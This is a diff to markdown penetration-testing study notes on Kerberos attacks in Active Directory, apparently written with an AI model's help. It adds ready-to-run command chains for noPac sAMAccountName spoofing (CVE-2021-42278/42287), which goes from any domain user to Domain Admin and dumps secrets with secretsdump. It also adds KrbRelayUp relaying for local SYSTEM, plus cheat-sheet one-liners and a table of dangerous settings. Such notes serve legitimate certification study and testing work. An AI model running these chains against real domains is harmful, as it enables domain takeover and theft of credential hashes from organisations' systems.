@@ -47,6 +47,9 @@ Network authentication protocol used by Active Directory. Based on tickets — c
 | [[Tools/AD/rbcd\|rbcd.py]] | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` to set up RBCD |
 | [[Tools/Auth/hashcat\|hashcat]] | Offline cracking of AS-REP (mode 18200) and TGS (mode 13100/19700) hashes |
 | [[Tools/Auth/john the ripper\|John the Ripper]] | Alternative offline cracker for AS-REP/TGS hashes |
+| [[Tools/AD/noPac\|noPac.py]] | Automated sAMAccountName spoofing (CVE-2021-42278/42287) — domain user → DA in one command |
+| [[Tools/AD/bloodyAD\|bloodyAD]] | Rename `sAMAccountName` in the manual noPac chain; RBCD / shadow-cred writes |
+| [[Tools/Lateral Movement/KrbRelayUp\|KrbRelayUp]] | Kerberos relay → RBCD/shadow-cred → SYSTEM (local privesc on a domain-joined host) |
 
 ---
 
@@ -329,6 +332,52 @@ export KRB5CCNAME=Administrator.ccache
 impacket-wmiexec <domain>/Administrator@<target> -k -no-pass
 ```
 
+### noPac / sAMAccountName Spoofing (CVE-2021-42278 + CVE-2021-42287)
+
+The single most impactful Kerberos privesc of the modern era: **any authenticated domain user → Domain Admin**, no special rights, if the DC is unpatched (pre-Nov-2021). It chains two bugs — **CVE-2021-42278** (AD never validated that a computer account's `sAMAccountName` ends in `$`) and **CVE-2021-42287** (when a TGS lookup fails, the KDC retries the name with a `$` appended). Create a machine account, rename it to a DC's name *without* the `$`, get a TGT, rename it back — now the TGT's name no longer resolves, so the KDC's fallback hands you a ticket as the **real DC**. S4U2self then impersonates any user to that DC.
+
+**Conditions:** any valid domain account; `MachineAccountQuota > 0` (default 10); DC missing the November 2021 patches.
+
+```bash
+# Automated — noPac.py does the whole chain and can dump straight to DCSync
+python3 scanner.py <domain>/<user>:<pass> -dc-ip <dc_ip>          # confirm vulnerable first
+python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_fqdn> \
+  --impersonate Administrator -dump                               # -dump = secretsdump on success
+python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_fqdn> \
+  --impersonate Administrator -shell                              # or drop to a semi-interactive shell
+
+# Manual chain (when you want each step, or noPac.py misbehaves)
+impacket-addcomputer <domain>/<user>:<pass> -dc-ip <dc_ip> \
+  -computer-name 'EVIL$' -computer-pass 'Password123'
+# Rename EVIL$ -> the DC's short name WITHOUT the trailing $ (renameMachine.py, or bloodyAD):
+bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' set object 'EVIL$' sAMAccountName -v 'DC01'
+impacket-getTGT <domain>/'DC01':'Password123' -dc-ip <dc_ip>      # TGT issued as "DC01"
+# Rename it back so "DC01" no longer resolves and the KDC falls back to DC01$:
+bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' set object 'DC01' sAMAccountName -v 'EVIL$'
+export KRB5CCNAME=DC01.ccache
+impacket-getST -self -impersonate Administrator -spn 'cifs/<dc_fqdn>' \
+  <domain>/'DC01':'Password123' -dc-ip <dc_ip>                    # ST as Administrator to the DC
+export KRB5CCNAME=Administrator@cifs_<dc_fqdn>@<domain>.ccache
+impacket-secretsdump -k -no-pass <dc_fqdn>
+```
+
+> [!warning] Patched November 2021 (KB5008102/5008380/5008602). Still found constantly on unpatched/legacy DCs. The manual chain leaves a machine account behind (`EVIL$`) and two `sAMAccountName` rename events — clean up the account and expect 4741/4742 audit entries.
+
+### Kerberos Relay → Local Privilege Escalation (KrbRelayUp)
+
+Kerberos was long thought un-relayable; **KrbRelay**/**KrbRelayUp** disproved it for the *local* case. On a domain-joined Windows host, a low-priv user can coerce local Kerberos authentication, relay the AP-REQ to LDAP or SCM, and configure **RBCD** (or a Shadow-Credential) against the machine's own computer account — yielding a SYSTEM shell. It's the Kerberos-only answer to "no local admin, `WebClient`/LDAP-signing not enforced".
+
+**Conditions:** foothold as any user on a domain-joined machine; LDAP signing not enforced (for the RBCD variant). No coercion of a *remote* victim needed — the target is the local machine account.
+
+```powershell
+# One-shot: relay to LDAP, set RBCD on the local computer, S4U, spawn SYSTEM
+.\KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName EVIL$ -ComputerPassword Password123
+.\KrbRelayUp.exe spawn -m rbcd -d <domain> -cn EVIL$ -cp Password123 -i <target_local_sid>
+# -m shadowcred is the alternative back-end when you'd rather not add a computer account
+```
+
+> [!note] This is *local* privesc (user → SYSTEM on one box), distinct from the domain-wide [[#Resource-Based Constrained Delegation (RBCD)]] above — same RBCD primitive, but the "victim" is the attacker's own machine account and the relay supplies the Kerberos ticket. Microsoft's fix guidance is to enforce LDAP signing + channel binding.
+
 ---
 
 ## Dangerous Settings
@@ -345,6 +394,9 @@ impacket-wmiexec <domain>/Administrator@<target> -k -no-pass
 | krbtgt hash compromised | Golden, Diamond, and Sapphire Ticket forgery — increasingly hard to detect in that order |
 | DA/SYSTEM on a DC without LSASS integrity monitoring | Skeleton Key — silent universal-password backdoor |
 | Old Kerberos encryption (RC4 only, no AES) | Faster hash cracking |
+| DC missing Nov-2021 patches | noPac (CVE-2021-42278/42287) — any domain user → DA |
+| `MachineAccountQuota > 0` for non-privileged users | Fuels noPac and RBCD — attacker can create the computer account both need |
+| LDAP signing / channel binding not enforced | Kerberos relay (KrbRelayUp) → SYSTEM; also enables classic NTLM-relay-to-LDAP |
 
 ---
 
@@ -365,14 +417,20 @@ impacket-wmiexec <domain>/Administrator@<target> -k -no-pass
 | Skeleton Key | `mimikatz # misc::skeleton` (then auth as anyone with password `mimikatz`) |
 | Bronze Bit | `Rubeus.exe s4u /user:svc /rc4:hash /impersonateuser:Administrator /msdsspn:SPN /bronzebit /ptt` |
 | Find delegation | `impacket-findDelegation domain/user:pass -dc-ip dc_ip` |
+| noPac (auto) | `noPac.py domain/user:pass -dc-ip dc_ip -dc-host dc_fqdn --impersonate Administrator -dump` |
+| noPac scan | `scanner.py domain/user:pass -dc-ip dc_ip` |
+| KrbRelayUp (local SYSTEM) | `KrbRelayUp.exe relay -Domain domain -CreateNewComputerAccount -ComputerName EVIL$ -ComputerPassword Password123` |
 | Sync clock | `sudo ntpdate dc_ip` |
 
 ---
 
-> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Metasploit|Metasploit]] — the Kerberos/AD module suite (forge_ticket golden/silver/diamond/sapphire, pass-the-ticket → DCSync) that mirrors these techniques from inside the framework.
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Metasploit|Metasploit]] — the Kerberos/AD module suite (forge_ticket golden/silver/diamond/sapphire, pass-the-ticket → DCSync) that mirrors these techniques from inside the framework. AD-integrated [[Services/Network management/DNS|DNS]] (ADIDNS) is the AD name-resolution/enumeration surface alongside this.
+> Service target: [[Services/Database Services/MSSQL|MSSQL]] — the `MSSQLSvc` SPN is a prime Kerberoasting target.
+> Enumeration source: [[Services/Network management/LDAP|LDAP]] — where SPN/`DONT_REQ_PREAUTH` accounts are discovered (and `nxc ldap --kerberoasting`/`--asreproast` pull the tickets).
+> Prerequisite: [[Services/Network management/NTP|NTP]] — sync your clock to the DC first or every request fails with `KRB_AP_ERR_SKEW` (> 5 min).
 
 ---
 
 *Created: 2026-07-27*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-23*
+*Model: claude-opus-4-8*
